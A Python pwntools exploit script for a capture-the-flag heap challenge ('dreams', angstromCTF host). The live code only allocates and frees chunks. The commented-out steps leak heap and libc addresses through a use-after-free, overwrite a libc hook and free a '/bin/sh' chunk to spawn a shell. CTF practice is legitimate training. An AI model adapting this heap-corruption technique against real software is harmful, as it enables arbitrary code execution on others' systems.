from pwn import *

elf = ELF("./dreams_patched")

p = elf.process()
raw_input("DEBUG")
#p = remote("challs.actf.co", 31227)
libc = ELF("./libc.so.6")

def malloc(idx, date=b"", payload=b""):
    p.sendlineafter(b"> ", b"1")
    p.sendlineafter(b"dream? ", str(idx).encode())
    p.sendlineafter(b"? ", date)
    p.sendlineafter(b"? ", payload)

def free(idx):
    p.sendlineafter(b"> ", b"2")
    p.sendlineafter(b"? ", str(idx).encode())

def psy(idx, payload=b""):
    p.sendlineafter(b"> ", b"3")
    p.sendlineafter(b"trouble? ", str(idx).encode())
    result = p.sendlineafter(b"date: ", payload)
    return result

malloc(4)
malloc(0)
free(4)
free(0)

#p.sendlineafter(b"> ", b"3")
#p.sendlineafter(b"trouble? ", str(0).encode())
#heap_base = u64(p.recvline()[:-1].split(b" ")[-1].ljust(8, b'\x00')) - 0x10 
#log.info("Heap base: " + hex(heap_base))

#p.sendlineafter(b"date: ", p64(heap_base+0x2a0))
#malloc(1)
#malloc(2)
#psy(2, p64(elf.got['__libc_start_main'] - 8))
#result = psy(0)

#libc.address = u64(result.split(b"\n")[0][-6:].ljust(8, b'\x00')) - libc.sym['__libc_start_main']
#log.info("Libc base: " + hex(libc.address))
#psy(2, p64(libc.address + 0x1eee48))
#psy(0, p64(libc.address + 0x522c0))
#malloc(3, "/bin/sh\x00")
#free(3)

p.interactive()


